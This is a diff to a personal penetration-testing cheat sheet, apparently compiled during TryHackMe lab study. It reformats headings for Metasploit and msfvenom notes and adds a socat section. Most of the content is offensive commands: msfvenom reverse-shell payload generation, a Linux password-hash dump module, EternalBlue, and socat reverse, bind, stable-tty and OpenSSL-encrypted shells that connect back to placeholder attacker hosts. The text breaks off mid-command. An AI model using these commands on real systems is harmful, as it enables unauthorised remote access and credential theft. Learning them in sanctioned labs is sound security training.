@@ -170,7 +170,7 @@ msf6 > nmap -sS 10.10.12.229
 
 ---
 
-# Handy msfconsole modules 
+## Handy msfconsole modules 
 
 Post Module to dump the password hashes for all users on a Linux System
 `linux/gather/hashdump
@@ -180,7 +180,8 @@ Eternal Blue exploit
 
 
 ---
-# msfvenom create payloads
+
+## msfvenom create payloads
 
 ```
 msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
@@ -200,7 +201,8 @@ sfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
 ```
 
 ---
-# Meterpreter Shells
+
+## Meterpreter Shells
 
 searches available meterpreter shells
 `msfvenom --list payloads | grep meterpreter`
@@ -244,5 +246,50 @@ linux handler Meterpreter Handler
 Meterpreter [CheatSheet](https://scadahacker.com/library/Documents/Cheat_Sheets/Hacking%20-%20Meterpreter%20Cheat%20%20Sheet.pdf)
 
 
+# socat
+
+## Reverse Shell
+
+basic reverse shell listener in socat
+`socat TCP-L:<port> -
+	will work on Linux or Windows
+
+windows reverse shell from target
+`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
+Linux Reverse shell from target
+`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
 
 
+## Bind Shell
+target command
+`socat TCP-L:<PORT> EXEC:"bash -li"
+listener for windows
+`socat TCP-L:<PORT> EXEC:powershell.exe,pipes
+>used to connect from attacking machine
+ `socat TCP:<TARGET-IP>:<TARGET-PORT> -
+
+---
+
+## Stable tty reverse shell
+
+Linux Target
+`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
+l
+istener
+``sudo socat TCP-L:<port> FILE:`tty`,raw,echo=0``
+
+As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z
+
+>https://tryhackme.com/room/introtoshells
+
+---
+## Encrypted Shells
+
+- Create Certificate
+`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
+- We then need to merge the two created files into a single `.pem` file:
+`cat shell.key shell.crt > shell.pem`
+- Now, when we set up our reverse shell listener, we use:
+`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
+- To connect back, we would use:
+`
